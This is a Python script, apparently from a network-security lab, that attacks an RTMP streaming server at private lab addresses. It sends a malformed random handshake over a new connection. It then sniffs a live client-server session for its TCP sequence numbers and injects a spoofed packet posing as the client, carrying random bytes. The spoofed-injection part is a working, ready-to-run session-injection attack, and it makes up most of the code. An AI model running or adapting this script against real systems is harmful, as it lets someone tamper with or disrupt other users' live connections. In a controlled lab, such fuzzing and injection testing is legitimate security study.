from scapy.all import IP, TCP, Raw, send, sniff, sr1
import random
import socket
import time

IP_CLIENTE = "172.18.0.3"
IP_SERVIDOR = "172.18.0.2"
PUERTO_RTMP = 1935

# ============================================================
# INYECCIÓN 1: Fuzzing en el handshake (conexión TCP nueva)
# ============================================================
def fuzz_handshake_nueva_conexion():
    """
    Abre una conexión TCP real hacia el servidor y, en vez de mandar
    el handshake RTMP válido (C0 + C1 = 1537 bytes con estructura definida),
    manda bytes completamente aleatorios.
    """
    print("[FUZZ 1] Abriendo conexión TCP nueva hacia el servidor...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((IP_SERVIDOR, PUERTO_RTMP))
        print("[FUZZ 1] Conectado. Enviando handshake malformado (bytes aleatorios)...")

        # C0 real sería: 1 byte de versión (0x03) + C1 (1536 bytes: 4 timestamp + 4 zero + 1528 random)
        # Aquí en cambio mandamos basura pura, sin la estructura correcta
        payload_fuzz = bytes([random.randint(0, 255) for _ in range(1537)])
        s.send(payload_fuzz)

        respuesta = s.recv(4096)
        print(f"[FUZZ 1] Respuesta del servidor ({len(respuesta)} bytes): {respuesta[:50]}")
    except socket.timeout:
        print("[FUZZ 1] Timeout: el servidor no respondió (probablemente descartó la conexión).")
    except ConnectionResetError:
        print("[FUZZ 1] Conexión reseteada por el servidor (RST) — rechazó el handshake inválido.")
    except Exception as e:
        print(f"[FUZZ 1] Excepción: {e}")
    finally:
        s.close()


# ============================================================
# INYECCIÓN 2: Fuzzing inyectado en la sesión ya establecida
# ============================================================
ultimo_seq = {"valor": None}
ultimo_ack = {"valor": None}
puerto_cliente = {"valor": None}

def capturar_seq_actual(paquete):
    """Callback de sniff: guarda el último seq/ack visto entre cliente y servidor."""
    if paquete.haslayer(TCP) and paquete.haslayer(IP):
        if paquete[IP].src == IP_CLIENTE and paquete[IP].dst == IP_SERVIDOR:
            ultimo_seq["valor"] = paquete[TCP].seq + len(paquete[TCP].payload if paquete.haslayer(Raw) else b"")
            ultimo_ack["valor"] = paquete[TCP].ack
            puerto_cliente["valor"] = paquete[TCP].sport
            return True  # detiene el sniff apenas captura uno
    return False

def fuzz_inyeccion_mid_stream():
    """
    Sniffea un paquete real cliente->servidor para tomar el seq/ack actual,
    y luego inyecta un paquete spoofeado (IP origen = cliente) con payload
    aleatorio del tamaño típico de un chunk RTMP, directamente en el servidor.
    """
    print("[FUZZ 2] Esperando capturar un paquete real cliente->servidor...")
    sniff(filter=f"tcp port {PUERTO_RTMP}", lfilter=lambda p: capturar_seq_actual(p), count=1, timeout=10)

    if ultimo_seq["valor"] is None:
        print("[FUZZ 2] No se capturó tráfico. ¿Está el streaming activo?")
        return

    print(f"[FUZZ 2] Seq capturado: {ultimo_seq['valor']}, puerto cliente: {puerto_cliente['valor']}")
    print("[FUZZ 2] Inyectando payload aleatorio como si viniera del cliente...")

    payload_fuzz = bytes([random.randint(0, 255) for _ in range(200)])  # tamaño típico de chunk

    paquete_falso = (
        IP(src=IP_CLIENTE, dst=IP_SERVIDOR) /
        TCP(sport=puerto_cliente["valor"], dport=PUERTO_RTMP,
            seq=ultimo_seq["valor"], ack=ultimo_ack["valor"], flags="PA") /
        Raw(load=payload_fuzz)
    )
    send(paquete_falso, verbose=1)
    print("[FUZZ 2] Paquete inyectado. Revisa el stream/logs del servidor para ver el efecto.")


if __name__ == "__main__":
    fuzz_handshake_nueva_conexion()
    time.sleep(3)
    fuzz_inyeccion_mid_stream()
